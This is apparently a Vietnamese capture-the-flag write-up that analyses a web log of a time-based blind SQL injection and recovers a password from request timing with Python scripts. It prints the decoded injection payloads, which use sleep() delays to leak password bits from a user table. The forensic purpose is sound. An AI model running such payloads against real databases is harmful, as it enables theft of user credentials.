---
title: "Log Analysis - Blind SQL Injection via Time-Based Attack"
date: 2025-07-04 12:00:00 +0700
categories: [CTF, Network Forensics]
tags: [sql-injection, blind-sqli, time-based, log-analysis, web-security]
image: /assets/img/posts/Capture_this/banner.png
---

## Giới thiệu

**Difficulty**: Medium  
**Category**: Network

Bài ctf đến từ rootme phân tích log để tìm password từ blind SQL injection time-based attack.

## Phân tích

Đầu tiên, ta sẽ giải mã base64

```bash
import urllib.parse
import re
import base64
with open ("ch13.txt", "r") as f:
    data = f.read().splitlines()
res = []
for line in data:
    match = re.search(r"order=(.*?) HTTP", line)
    if match:
        res.append(match.group(1))
f2 = open("output.txt", "w")
for x in res:
    f2.write(base64.b64decode(urllib.parse.unquote(x)).decode() + '\n')
```

```bash
ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),1,1),substring(bin(ascii(substring(password,1,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),3,1),substring(bin(ascii(substring(password,1,1))),4,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),5,1),substring(bin(ascii(substring(password,1,1))),6,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),7,1)),char(48),char(49)) when 1 then sleep(2) when 2 then sleep(4)  end) from membres where id=1)
ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),1,1),substring(bin(ascii(substring(password,2,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),3,1),substring(bin(ascii(substring(password,2,1))),4,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),5,1),substring(bin(ascii(substring(password,2,1))),6,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)
ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),7,1)),char(48),char(49)) when 1 then sleep(2) when 2 then sleep(4)  end) from membres where id=1)
```

attacker brute force 2 bit một, đến bit thứ 7 thì chỉ brute force 1 bit.

nếu là 00 thì không sleep, 01 sleep 2s, 10 sleep 4s, 11 sleep 6s.

bit thứ 7 là 0 thì sleep 2s, là 1 thì sleep 4s

## Extract password từ timing

```bash
import sys
import re
from datetime import datetime
import binascii
f = open("ch13.txt", "r")
data = f.read().splitlines()

time =[]
for line in data:
    match = re.search(r"\b\d{1,2}:\d{2}:\d{2}\b", line)
    if match:
        time.append(match.group(0))
flag = ""
tmp = ""
for i in range(1, len(time)):
    start = datetime.strptime(time[i - 1] , "%H:%M:%S")
    end = datetime.strptime(time[i], "%H:%M:%S")
    difference = end -start
    seconds = int(str(difference)[-2:])
    if i % 4 != 0:
        if seconds == 0 or seconds == 1:
            tmp += "00"
        elif seconds == 2:
            tmp += "01"
        elif seconds == 4:
            tmp += "10"
        else :
            tmp += "11"
    else:
        if seconds == 2:
            tmp += "0"
        elif seconds == 4:
            tmp += "1"
        # tmp += "0"
        # tmp = tmp [::-1]
        print(tmp)
        flag += chr(int(tmp, 2))
        tmp = ""
print(flag)
```

các chữ cái sẽ có nhị phân dạng như sau 1xxxxx(x)

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/log_analasis]
└─$ python3 -i get_flag.py
1100111
111001
1010101
1010111
1000100
111000
1000101
1011010
1100111
1000010
1101000
1000010
1110000
1100011
110100
1101110
1010100
1010011
1000001
1010011
```

nếu bit thứ 7 không tìm thấy thời gian sẽ là 0s

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/log_analasis]
└─$ python3 -i get_flag.py
1100111
111001
1010101
1010111
1000100
111000
1000101
1011010
1100111
1000010
1101000
1000010
1110000
1100011
110100
1101110
1010100
1010011
1000001
1010011
g9UWD8EZgBhBpc4nTSAS # flag
```

**Flag**: `g9UWD8EZgBhBpc4nTSAS`
